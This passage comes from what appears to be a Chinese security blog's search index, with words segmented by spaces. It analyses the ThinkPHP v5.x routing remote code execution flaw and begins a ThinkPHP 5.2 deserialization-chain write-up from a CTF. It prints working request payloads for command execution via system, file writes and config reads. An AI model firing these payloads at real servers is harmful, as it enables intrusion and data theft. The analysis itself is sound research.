\u9ed8\u8ba4 \u7684 \u5206\u5272 \u7b26   \u9996\u5148 \u5bf9   $ url   \u66ff\u6362 \u5206\u5272 \u7b26\u4e3a   |   \uff0c \u518d \u8f93\u5165 \u5230   parseUrlPath   \u51fd\u6570 ( \u6839\u636e   /   \u5206\u5272 ) \uff0c \u8be5 \u51fd\u6570 \u5bf9 pathinfo \u8fdb\u884c \u5206\u5272 \uff0c \u4ea7\u751f   module   \u3001   controller   \u3001   action   \u90a3\u4e48 \u73b0\u5728 \u6765\u770b rce \u7684 Poc   ? s = / index / \\ think \\ app / invokefunction   = >   [ module : index , controller : \\ think \\ app , action : invokefunction ]   \u5176\u4e2d controller = > \\ think \\ app \uff0c \u662f php \u547d\u540d \u7a7a\u95f4 \u7684 \u8868\u793a \u65b9\u5f0f \uff0c \\ think \\ app \u5b9e\u9645 \u8c03\u7528 library / think / App . php \uff0c \u540e\u9762 \u7684 action \u5b9e\u9645 \u8c03\u7528 \u7684 App . php \u4e2d \u7684 invokefunction \u51fd\u6570","title":"\u5173\u4e8e thinkphp \u7684 url \u89e3\u6790 \u65b9\u5f0f"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_4","text":"\u4e0a\u9762 \u5206\u6790 \u4e86 thinkphp \u7684 \u517c\u5bb9 \u6a21\u5f0f \u662f \u5982\u4f55 \u5904\u7406 s \u53c2\u6570 \u7684 \uff0c \u5e76\u4e14 \u5904\u7406 \u5b58\u5728 \u4e00\u4e2a \u95ee\u9898 \u5c31\u662f \u53ef\u4ee5 \u4f2a\u9020 controller \uff0c \u5bfc\u81f4 \u5b9e\u9645 \u8c03\u7528 \u4e3a \u5176\u4ed6 \u7684 \u7c7b \u548c \u51fd\u6570   \u770b \u4e00\u4e0b \u62ff\u5230 module \u3001 controller \u3001 action \u540e \u7cfb\u7edf \u7684 \u5904\u7406   thinkphp / library / think / App . php   \u7684   module \u51fd\u6570   public   static   function   module ( $ result ,   $ config ,   $ convert   =   null )   {   if   ( is _ string ( $ result ) )   {   $ result   =   explode ( ' / ' ,   $ result ) ;   }   $ request   =   Request : : instance ( ) ;   ...   / /   \u8bbe\u7f6e \u9ed8\u8ba4 \u8fc7\u6ee4 \u673a\u5236   $ request - > filter ( $ config [ ' default _ filter ' ] ) ;   ...   try   {   $ instance   =   Loader : : controller ( / /   \u5b9e\u4f8b \u5316 controller \u7c7b   $ controller ,   $ config [ ' url _ controller _ layer ' ] ,   $ config [ ' controller _ suffix ' ] ,   $ config [ ' empty _ controller ' ]   ) ;   }   catch   ( ClassNotFoundException   $ e )   {   throw   new   HttpException ( 404 ,   ' controller   not   exists : '   .   $ e - > getClass ( ) ) ;   }   / /   \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u540d   $ action   =   $ actionName   .   $ config [ ' action _ suffix ' ] ;   $ vars   =   [ ] ;   if   ( is _ callable ( [ $ instance ,   $ action ] ) )   {   / /   \u6267\u884c \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5   $ call   =   [ $ instance ,   $ action ] ;   / /   \u4e25\u683c \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5 \u540d   $ reflect   =   new   \\ ReflectionMethod ( $ instance ,   $ action ) ;   $ methodName   =   $ reflect - > getName ( ) ;   $ suffix   =   $ config [ ' action _ suffix ' ] ;   $ actionName   =   $ suffix   ?   substr ( $ methodName ,   0 ,   - strlen ( $ suffix ) )   :   $ methodName ;   $ request - > action ( $ actionName ) ;   }   elseif   ( is _ callable ( [ $ instance ,   ' _ empty ' ] ) )   {   / /   \u7a7a \u64cd\u4f5c   $ call   =   [ $ instance ,   ' _ empty ' ] ;   $ vars   =   [ $ actionName ] ;   }   else   {   / /   \u64cd\u4f5c \u4e0d \u5b58\u5728   throw   new   HttpException ( 404 ,   ' method   not   exists : '   .   get _ class ( $ instance )   .   ' - > '   .   $ action   .   ' ( ) ' ) ;   }   Hook : : listen ( ' action _ begin ' ,   $ call ) ;   return   self : : invokeMethod ( $ call ,   $ vars ) ; / /   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   }   \u62ff\u5230 \u5b9e\u4f8b \u5316\u540e \u7684 \u5bf9\u8c61 \u548c \u65b9\u6cd5 \uff0c \u52a8\u6001 \u8c03\u7528   invokeMethod   public   static   function   invokeMethod ( $ method ,   $ vars   =   [ ] )   {   if   ( is _ array ( $ method ) )   {   $ class   =   is _ object ( $ method [ 0 ] )   ?   $ method [ 0 ]   :   self : : invokeClass ( $ method [ 0 ] ) ;   $ reflect   =   new   \\ ReflectionMethod ( $ class ,   $ method [ 1 ] ) ;   }   else   {   / /   \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5   $ reflect   =   new   \\ ReflectionMethod ( $ method ) ;   }   $ args   =   self : : bindParams ( $ reflect ,   $ vars ) ; / /   \u83b7\u53d6 \u53c2\u6570 \u5185\u5bb9   \u8fd9\u91cc \u83b7\u53d6 \u5230 \u53c2\u6570 \u7528\u505a method \u7684 \u53c2\u6570 \u8f93\u5165   self : : $ debug   &&   Log : : record ( ' [   RUN   ]   '   .   $ reflect - > class   .   ' - > '   .   $ reflect - > name   .   ' [   '   .   $ reflect - > getFileName ( )   .   '   ] ' ,   ' info ' ) ;   return   $ reflect - > invokeArgs ( isset ( $ class )   ?   $ class   :   null ,   $ args ) ;   }   \u8fd9\u91cc \u4f7f\u7528 bindParams \u51fd\u6570 \u4ece get \u6216 post \u4e2d \u83b7\u53d6 \u5230 \u5bf9\u5e94 \u7684 \u5185\u5bb9 \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u505a \u53c2\u6570 \u5d4c\u5165 \u65f6 \uff0c \u9700\u8981 \u4ee5 \u51fd\u6570 \u7684 \u53c2\u6570 \u540d\u4e3a \u952e   \u5982 invokeFunction \u7684 \u53c2\u6570 \u4e3a   $ function   \u3001   $ vars   \uff0c \u90a3\u4e48 \u5728 \u53c2\u6570 \u4e2d \u5c31 \u9700\u8981 \u4ee5   function = xxx & vars [ 0 ] = xxx & vars [ 1 ] = xxx   \u5373 poc \u7684 \u540e \u534a \u90e8\u5206   function = call _ user _ func _ array & vars [ 0 ] = system & vars [ 1 ] [ ] = ls% 20 - l   \u6240\u4ee5 \u8c03\u7528 \u94fe \u73b0\u5728 \u53d8\u6210 \u4e86   1 .   \u52a8\u6001 \u8c03\u7528 \\ think \\ app   invokeFunction \u51fd\u6570   2 .   \u63d0\u4f9b function = call _ user _ func _ array \u4f5c\u4e3a invokeFunction \u52a8\u6001 \u8c03\u7528 \u7684 \u53c2\u6570 \uff0c \u6240\u4ee5 \u4e0b \u4e00\u6b65 \u8c03\u7528 call _ user _ func _ array \u51fd\u6570   3 .   call _ user _ func _ array \u7684 \u53c2\u6570 \u4e3a system \u51fd\u6570 \uff0c system \u51fd\u6570 \u7684 \u53c2\u6570 \u4e3a ls   - l \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7528 \u4e86 2 \u7ef4 \u6570\u7ec4   \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u53d1\u6563 \u4e00\u4e0b \u601d\u7ef4 \uff0c \u6211\u4eec \u5176\u5b9e \u4e0d \u5355\u5355 \u53ef\u4ee5 \u8c03\u7528 \\ think \\ app \u8fd9\u4e2a \u7c7b \uff0c \u5982\u679c \u5176\u4ed6 \u7684 \u7c7b \u53ef\u4ee5 \u4efb\u610f \u8c03\u7528 \u5176\u4ed6 \u51fd\u6570 \uff0c \u6216\u8005 \u662f \u8c03\u7528 \u547d\u4ee4 \u6267\u884c \u51fd\u6570 \uff0c \u540c\u6837 \u5177\u6709 \u5371\u5bb3 \u5371\u5bb3\u6027   \u5982 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   ? s = / index / think \\ view \\ driver \\ php / display & content = < ? php% 20phpinfo ( ) ;   \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u751f\u6210 \u5728 index . php \u540c \u4e00\u7ea7 \u76ee\u5f55   ? s = index / \\ think \\ template \\ driver \\ file / write & cacheFile = test . php & content = < ? php% 20phpinfo ( ) ;   \u83b7\u53d6 \u914d\u7f6e \u4fe1\u606f   ? s = index / \\ think \\ config / get & name = database . username","title":"\u6f0f\u6d1e \u6210\u56e0 \u70b9"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphp-v51x","text":"","title":"thinkphp   v5.1 . x"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_5","text":"\u7248\u672c \uff1a < =   v5.1 . 30   \u8865\u4e01 \u4fe1\u606f \uff1a   \u4fee\u6b63 \u63a7\u5236 \u63a7\u5236\u5668 \u8c03\u7528   \u00b7   top - think / framework @ 802f284   \u00b7   GitHub   \u6f0f\u6d1e \u70b9 \uff1a thinkphp / library / think / route / dispatch / Module . php","title":"\u7248\u672c\u4fe1\u606f"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_6","text":"\u539f\u7406 \u540c v5.0 . x \u7248\u672c \u7c7b\u4f3c \uff0c \u4e5f \u662f \u7531\u4e8e s \u53c2\u6570 \u5e26\u5165 \u7684 \u8def\u5f84 \u89e3\u6790 \u5b58\u5728 \u5b89\u5168 \u95ee\u9898 \u5bfc\u81f4 \u7684 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   \u5148\u770b App : : run ( )   public   function   run ( )   {   try   {   / /   \u521d\u59cb \u521d\u59cb\u5316 \u5e94\u7528   $ this - > initialize ( ) ;   ...   $ dispatch   =   $ this - > dispatch ;   if   ( empty ( $ dispatch ) )   {   / /   \u8def\u7531 \u68c0\u6d4b   $ dispatch   =   $ this - > routeCheck ( ) - > init ( ) ; / /   \u5904\u7406 module \u3001 controller \u3001 action   }   / /   \u8bb0\u5f55 \u5f53\u524d \u8c03\u5ea6 \u4fe1\u606f   $ this - > request - > dispatch ( $ dispatch ) ;   ...   }   catch   ( HttpResponseException   $ exception )   {   $ dispatch   =   null ;   $ data   =   $ exception - > getResponse ( ) ;   }   $ this - > middleware - > add ( function   ( Request   $ request ,   $ next )   use   ( $ dispatch ,   $ data )   {   return   is _ null ( $ data )   ?   $ dispatch - > run ( )   :   $ data ;   } ) ;   $ response   =   $ this - > middleware - > dispatch ( $ this - > request ) ; / /   \u52a8\u6001 \u8c03\u7528 controller \u3001 action   ...   return   $ response ;   }   App : : run ( ) \u51fd\u6570 \u4f53\u73b0 \u4e86 \u7a0b\u5e8f \u7684 \u4e00\u4e2a \u4e3b\u8981 \u6d41\u7a0b \uff0c \u4ece \u8def\u5f84 \u7684 \u89e3\u6790 \u5230 \u52a8\u6001 \u89e3\u6790 \u6267\u884c \u76f8\u5e94 \u7684 \u63a7\u5236 \u63a7\u5236\u5668 \u53ca \u65b9\u6cd5   \u5148 \u6765 \u770b\u770b \u7b2c 13 \u884c \uff0c \u83b7\u53d6 \u76f8\u5e94 \u7684 \u8def\u5f84 \u4fe1\u606f   thinkphp / library / think / App . php   routeCheck ( ) \u51fd\u6570   public   function   routeCheck ( )   {   / /   \u68c0\u6d4b \u8def\u7531 \u7f13\u5b58   ...   / /   \u83b7\u53d6 \u5e94\u7528 \u8c03\u5ea6 \u4fe1\u606f   $ path   =   $ this - > request - > path ( ) ;   / /   \u4ece Request . php   path \u63d0\u53d6 urlpath   \u5177\u4f53 \u4ece pathinfo ( ) \uff0c \u4f18\u5148 \u83b7\u53d6 $ _ GET [ $ this - > config [ ' var _ pathinfo ' ] ]   / /   var _ pathinfo   \u9ed8\u8ba4 \u4e3a s   / /   \u662f\u5426 \u5f3a\u5236 \u8def\u7531 \u6a21\u5f0f   $ must   =   ! is _ null ( $ this - > routeMust )   ?   $ this - > routeMust   :   $ this - > route - > config ( ' url _ route _ must ' ) ;   / /   \u8def\u7531 \u68c0\u6d4b   \u8fd4\u56de \u4e00\u4e2a Dispatch \u5bf9\u8c61   $ dispatch   =   $ this - > route - > check ( $ path ,   $ must ) ; / / \u8fd4\u56de UrlDispatch \u7c7b \u5b9e\u4f8b \uff0c \u4ece dispatch \u7c7b\u5904 \u7ee7\u627f   ...   return   $ dispatch ;   }   \u7b2c 7 \u884c\u4ece s \u53c2\u6570 \u4e2d \u83b7\u53d6 \u8def\u7531 \u8def\u5f84 ( s \u4e3a var _ pathinfo \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c ) \uff0c \u5728 \u8c03\u7528 routeCheck \u51fd\u6570 \u540e \u8fd4\u56de \u4e00\u4e2a UrlDispatch \uff0c \u4e4b\u540e \u8c03\u7528 \u4e86 Url \u7c7b \u7684 init \u51fd\u6570   thinkphp / library / think / route / dispatch / Url . php   init   public   function   init ( )   {   / /   \u89e3\u6790 \u9ed8\u8ba4 \u7684 URL \u89c4\u5219   $ result   =   $ this - > parseUrl ( $ this - > dispatch ) ;   / /   parseUrl \u51fd\u6570 \u5904\u7406 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c ( \u4ee5 / \u5206\u5272 \uff0c \u4f20\u5165 | \u4e5f \u884c\u4f1a \u88ab \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 / \uff0c \u6700\u7ec8 \u7531 / \u6765 \u5206\u5272 ) \uff0c \u8fd4\u56de [ module , controller , action ]   return   ( new   Module ( $ this - > request ,   $ this - > rule ,   $ result ) ) - > init ( ) ;   }   \u8fd4\u56de Module \u5bf9\u8c61 \uff0c \u7ee7\u627f \u81ea Dispatch \u5bf9\u8c61 \uff0c \u5e76\u4e14 \u8c03\u7528 \u4e86 init \u51fd\u6570 \uff0c \u5c06 \u89e3\u6790 \u540e \u7684 \u8def\u7531 \u586b\u5145 \u5230 dispatch \uff0c \u4f9b \u540e\u9762 App : : run ( ) \u51fd\u6570 \u52a8\u6001 \u8c03\u7528 dispatch \u7684 run \u51fd\u6570 \uff0c v5.1 \u7248\u672c \u7684 \u8c03\u7528 \u94fe \u590d\u6742 \u4e86 \u4e00\u70b9 \uff0c \u4f46\u662f \u5176\u5b9e \u5185\u5bb9 \u540c v5.0 \u7248\u672c \u7c7b\u4f3c   Dispatch : : run ( ) \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 Module : : exec ( ) \u51fd\u6570   thinkphp / library / think / route / dispatch / Module . php   exec ( )   public   function   exec ( )   {   / /   \u76d1\u542c module _ init   $ this - > app [ ' hook ' ] - > listen ( ' module _ init ' ) ;   try   {   / /   \u5b9e\u4f8b \u5316 \u63a7\u5236 \u63a7\u5236\u5668   $ instance   =   $ this - > app - > controller ( $ this - > controller ,   $ this - > rule - > getConfig ( ' url _ controller _ layer ' ) ,   $ this - > rule - > getConfig ( ' controller _ suffix ' ) ,   $ this - > rule - > getConfig ( ' empty _ controller ' ) ) ;   if   ( $ instance   instanceof   Controller )   {   $ instance - > registerMiddleware ( ) ;   }   }   catch   ( ClassNotFoundException   $ e )   {   throw   new   HttpException ( 404 ,   ' controller   not   exists : '   .   $ e - > getClass ( ) ) ;   }   / /   \u95ed\u5305 \u8c03\u7528   $ this - > app [ ' middleware ' ] - > controller ( function   ( Request   $ request ,   $ next )   use   ( $ instance )   {   / /   \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u540d   $ action   =   $ this - > actionName   .   $ this - > rule - > getConfig ( ' action _ suffix ' ) ;   if   ( is _ callable ( [ $ instance ,   $ action ] ) )   {   / /   \u6267\u884c \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5   $ call   =   [ $ instance ,   $ action ] ;   / /   \u4e25\u683c \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5 \u540d   $ reflect   =   new   ReflectionMethod ( $ instance ,   $ action ) ;   $ methodName   =   $ reflect - > getName ( ) ;   $ suffix   =   $ this - > rule - > getConfig ( ' action _ suffix ' ) ;   $ actionName   =   $ suffix   ?   substr ( $ methodName ,   0 ,   - strlen ( $ suffix ) )   :   $ methodName ;   $ this - > request - > setAction ( $ actionName ) ;   / /   \u81ea\u52a8 \u83b7\u53d6 \u8bf7\u6c42 \u53d8\u91cf   $ vars   =   $ this - > rule - > getConfig ( ' url _ param _ type ' )   ?   $ this - > request - > route ( )   :   $ this - > request - > param ( ) ;   $ vars   =   array _ merge ( $ vars ,   $ this - > param ) ;   }   elseif   ( is _ callable ( [ $ instance ,   ' _ empty ' ] ) )   {   / /   \u7a7a \u64cd\u4f5c   $ call   =   [ $ instance ,   ' _ empty ' ] ;   $ vars   =   [ $ this - > actionName ] ;   $ reflect   =   new   ReflectionMethod ( $ instance ,   ' _ empty ' ) ;   }   else   {   / /   \u64cd\u4f5c \u4e0d \u5b58\u5728   throw   new   HttpException ( 404 ,   ' method   not   exists : '   .   get _ class ( $ instance )   .   ' - > '   .   $ action   .   ' ( ) ' ) ;   }   $ this - > app [ ' hook ' ] - > listen ( ' action _ begin ' ,   $ call ) ;   $ data   =   $ this - > app - > invokeReflectMethod ( $ instance ,   $ reflect ,   $ vars ) ;   return   $ this - > autoResponse ( $ data ) ;   } ) ;   return   $ this - > app [ ' middleware ' ] - > dispatch ( $ this - > request ,   ' controller ' ) ;   }   \u7b80\u5355 \u63cf\u8ff0 exec \u51fd\u6570 \uff0c \u5b9e\u4f8b \u5316 controller \uff0c \u7528\u4e8e \u540e\u9762 20 \u884c\u5230 55 \u884c \u7684 \u95ed\u5305 \u51fd\u6570 \uff0c \u8fd9\u4e2a \u5fc5\u62a5 \u51fd\u6570 \u4e3b\u8981 \u5b8c\u6210 \u4e86 \u8c03\u7528 controller \u7684 action \uff0c \u5e76 \u83b7\u53d6 \u8f93\u5165 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \uff0c \u6700\u540e \u7531 invokeReflectMethod \u5b8c\u6210 \u4e3b\u8981 \u7684 \u8c03\u7528 \u3002   \u6700\u7ec8 \u7684 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u4e3a Request : : filterValue \u51fd\u6570   private   function   filterValue ( & $ value ,   $ key ,   $ filters )   {   $ default   =   array _ pop ( $ filters ) ;   foreach   ( $ filters   as   $ filter )   {   if   ( is _ callable ( $ filter ) )   {   / /   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u6216\u8005 \u65b9\u6cd5 \u8fc7\u6ee4   $ value   =   call _ user _ func ( $ filter ,   $ value ) ; / / \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   }   elseif   ( is _ scalar ( $ value ) )   {   if   ( false   ! = =   strpos ( $ filter ,   ' / ' ) )   {   / /   \u6b63\u5219 \u8fc7\u6ee4   if   ( ! preg _ match ( $ filter ,   $ value ) )   {   / /   \u5339\u914d \u4e0d \u6210\u529f \u8fd4\u56de \u9ed8\u8ba4 \u9ed8\u8ba4\u503c   $ value   =   $ default ;   break ;   }   }   elseif   ( ! empty ( $ filter ) )   {   / /   filter \u51fd\u6570 \u4e0d \u5b58\u5728 \u65f6 ,   \u5219 \u4f7f\u7528 filter _ var \u8fdb\u884c \u8fc7\u6ee4   / /   filter \u4e3a \u975e \u6574\u5f62 \u503c\u65f6 ,   \u8c03\u7528 filter _ id \u53d6\u5f97 \u8fc7\u6ee4 id   $ value   =   filter _ var ( $ value ,   is _ int ( $ filter )   ?   $ filter   :   filter _ id ( $ filter ) ) ;   if   ( false   = = =   $ value )   {   $ value   =   $ default ;   break ;   }   }   }   }   return   $ value ;   }   \u5230 \u8fd9\u91cc \u5176\u5b9e \u601d\u8def \u5f88 \u660e\u663e \uff0c \u5229\u7528 / \u5206\u5272 \u51fa\u80fd \u5229\u7528 \u7684 controller \uff0c \u5e76 \u8f93\u5165 \u76f8\u5e94 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e \u53ef \u5229\u7528 \u7684 \u51fd\u6570 \u3002   v5.0 \u7248\u672c \u4e2d poc \u90fd \u80fd \u7528   \u5982 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   ? s = / index / think \\ view \\ driver \\ php / display & content = < ? php% 20phpinfo ( ) ;   \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u751f\u6210 \u5728 index . php \u540c \u4e00\u7ea7 \u76ee\u5f55   ? s = index / \\ think \\ template \\ driver \\ file / write & cacheFile = test . php & content = < ? php% 20phpinfo ( ) ;   \u83b7\u53d6 \u914d\u7f6e \u4fe1\u606f   ? s = index / \\ think \\ config / get & name = database . username   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u8fd8 \u53ef\u4ee5 \u4f7f\u7528 \\ think \\ request / input \uff08 v5.0 \u7248\u672c \u4e0d\u80fd \u7528 \u56e0\u4e3a \u662f\u56e0\u4e3a think \\ request \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u4e3a protected \uff0c \u4e0d \u5141\u8bb8 \u52a8\u6001 \u8c03\u7528 \uff09   \u5982 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   ? s = index / \\ think \\ request / input & data [ ] = 123 & filter = phpinfo   invokeFunction \u6838\u5fc3 ReflectionFunction   ? s = index / \\ think \\ container / invokeFunction & function = call _ user _ func & vars [ 0 ] = phpinfo & vars [ 1 ] = 1   ? s = index / \\ think \\ container / invokeFunction & function = call _ user _ func _ array & vars [ 0 ] = phpinfo & vars [ 1 ] [ ] = 1   \u56e0\u4e3a think \\ app \u7ee7\u627f \u81ea think \\ container \uff0c \u6240\u4ee5 \u6539\u6210 think \\ app \u4e5f \u884c   \u5176\u4e2d call _ user _ func \u586b\u5145 \u53c2\u6570 \u65f6 \uff0c \u4ee5 \u6570\u7ec4 \u5f62\u5f0f \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4e3a \u51fd\u6570 \u540d \uff0c \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4e3a \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570   call _ user _ func _ array \u586b\u5145 \u53c2\u6570 \u65f6 \uff0c \u4ee5 \u6570\u7ec4 \u5f62\u5f0f \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4e3a \u51fd\u6570 \u540d \uff0c \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4e3a \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff08 \u4e5f \u4e3a \u6570\u7ec4 \u5f62\u5f0f \uff09   \u8fd9\u91cc v5.1 \u53ea\u80fd \u7528 php7 \uff0c \u5982 v5.0 \u8fd8 \u53ef\u4ee5 \u4f7f\u7528 assert \u6765 \u6267\u884c \u51fd\u6570","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_7","text":"\u8fd9\u6b21 \u51fa \u7684 \u8fd9\u4e2a \u6f0f\u6d1e \u5371\u5bb3 \u5f88\u5927 \uff0c \u6574\u4e2a \u8c03\u7528 \u8fc7\u7a0b \u4e5f \u975e\u5e38 \u6f02\u4eae \uff0c \u503c\u5f97 \u4e00\u6b65 \u4e00\u6b65 \u8c03\u8bd5 \u3002   \u5176\u4e2d \u6536\u83b7 \u5927\u81f4 \u5c31\u662f \u4e86\u89e3 \u4e86 thinkphp   v5 \u7248\u672c \u8def\u7531 \u8c03\u7528 \u7684 \u6d41\u7a0b \uff0c v5.1 \u7248\u672c \u7684 \u95ed\u5305 \u51fd\u6570 \u6784\u9020 \u7684 \u65b9\u5f0f \u7ed9 \u6846\u67b6 \u5e26\u6765 \u4e86 \u4e0d \u4e00\u6837 \u7684 \u611f\u53d7 \uff0c \u4e0d\u5f97 \u4e0d\u5f97\u4e0d \u7ed9 thinkphp \u4e00\u4e2a \u8d5e","title":"\u603b\u7ed3"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"0x00   \u524d\u8a00   \u4e0a\u5468 \u53c2\u4e0e \u4e86 N1CTF \uff0c \u91cc\u9762 \u6709 \u4e00\u9053 \u5173\u4e8e thinkphp5 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5229\u7528 \u3002 \u8bb0\u5f55 \u4e00\u4e0b \u5173\u4e8e \u8be5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790 \u3002   \u540e\u6587 \u4e3b\u8981 \u5305\u62ec \u4e24\u6761 \u94fe \u7684 \u5229\u7528 \u5206\u6790 \uff08 \u4e00\u6761 \u662f \u6211 \u627e \u7684 \uff0c \u4e5f \u662f \u9898\u76ee \u7684 \u9884\u671f \u89e3 \uff0c \u53e6 \u4e00\u6761 \u662f wonderkun \u5e08\u5085 \u627e \u7684 \u975e \u9884\u671f \u89e3 \uff09   0x01   \u73af\u5883 \u51c6\u5907   \u8fd9\u91cc \u5c31 \u4e0d \u76f4\u63a5 \u7528 \u9898\u76ee \u7684 \u73af\u5883 \u4e86 \uff0c \u91c7\u7528 composer \u76f4\u63a5 \u5b89\u88c5 5.2 . * - dev \u7248\u672c   composer   create - project   topthink / think   =   5   . 2 . x - dev   v5.2   0x02   \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790   \u80cc\u666f \u56de\u987e   tp5 \u5728 \u6211 \u5370\u8c61 \u91cc \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5229\u7528 \u94fe \u5b58\u5728 \u4e00\u4e2a Windows \u7c7b \u7684 \u4efb\u610f \u6587\u4ef6 \u5220\u9664 \uff0c \u4f46\u662f \u5728   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u7684 \u542f\u793a \u4e0b \uff0c \u4e5f \u7b97\u662f \u627e\u5230 \u4e86 \u4e00\u6761 \u65b0 \u7684 \u8def \uff08 \u5173\u4e8e   __ toString   \u7684 \u89e6\u53d1 \u65b9\u5f0f \uff0c \u9664\u4e86 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u7684 \u65b9\u5f0f \uff0c \u8fd8 \u53ef\u4ee5 \u5229\u7528 PHP \u81ea\u5e26 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u7684 \u5f3a\u5236 \u8f6c\u6362 \uff09 \u3002   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u7684 \u5229\u7528 \u94fe \u6700\u540e \u7528\u5230 \u4e86 5.1 . 37 \u7248\u672c   think / Request . php   \u7684   __ call   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u7684 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u540d \u53ef\u63a7 \uff0c \u6240\u4ee5 \u53ef\u4ee5 \u5bfc\u81f4 \u4efb\u610f \u8c03\u7528 \u5176\u4ed6 \u7684 \u7c7b \u51fd\u6570 \u3002 \u800c \u5728 5.2 . x \u7248\u672c \u4e0d \u5b58\u5728 \u8fd9\u6837 \u7684 \u4e00\u4e2a   __ call   \u51fd\u6570 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u6700\u7ec8 \u8fbe\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff08   __ call   \u51fd\u6570 \u524d \u7684 \u5229\u7528 \u94fe \u4ecd\u7136 \u53ef\u7528 \uff09 \u3002   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6211\u4eec \u6765 \u770b\u770b 5.2 . x \u65b0 \u7684 \u5229\u7528 \u94fe \u5427 \uff1a \uff09   think / model / concern / Attribute . php   getValue \u53ef \u51fd\u6570 \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \uff08 \u9898\u76ee \u7684 \u9884\u671f \u89e3 \uff09   \u7531\u4e8e 5.1 . 37   __ call   \u51fd\u6570 \u524d \u7684 \u5229\u7528 \u94fe \u4ecd\u7136 \u5b58\u5728 \u4e8e 5.2 . x \u7248\u672c \uff0c \u8fd9\u91cc \u5c31 \u4e0d\u518d \u8be6\u8ff0 \u4e86 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b Conversion \u7c7b \u7684 toArray \u51fd\u6570   public   function   toArray ( ) :   array   {   / /   ...   / /   \u5408\u5e76 \u5173\u8054 \u6570\u636e   $ data   =   array _ merge ( $ this - > data ,   $ this - > relation ) ;   foreach   ( $ data   as   $ key   = >   $ val )   {   if   ( $ val   instanceof   Model   | |   $ val   instanceof   ModelCollection )   {   / /   ...   }   elseif   ( isset ( $ this - > visible [ $ key ] ) )   {   $ item [ $ key ]   =   $ this - > getAttr ( $ key ) ; / /   relation \u548c visible \u5b58\u5728 \u540c\u4e00 \u4e00\u4e2a \u540c\u4e00\u4e2a key \u5c31\u884c   / /   ...   }   / /   ...   \u53bb\u6389 \u4e86 \u65e0\u5173 \u7684 \u4ee3\u7801 \uff0c \u8fd9\u91cc   $ this - > visible   \u3001   $ this - > relation   \u5747 \u53ef\u63a7 \uff0c 